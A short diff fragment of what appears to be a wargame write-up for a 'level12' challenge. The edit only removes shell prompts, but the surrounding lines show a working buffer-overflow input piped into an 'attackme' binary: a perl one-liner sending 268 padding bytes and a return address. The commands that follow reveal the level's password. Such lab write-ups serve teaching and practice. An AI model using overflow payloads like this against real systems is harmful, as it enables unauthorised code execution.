@@ -194,10 +194,10 @@ EGG : 0xbffff69c
 
 sh-2.05b$ (perl -e 'print "A"x268,"\x9c\xf6\xff\xbf"';cat) | /home/level12/attackme
 
-sh-2.05b$ id
+id
 uid=3092(level12) gid=3092(level12) groups=3092(level12)
 
-sh-2.05b$ my-pass
+my-pass
 Level12 Password is "it is like this".
 
 ```
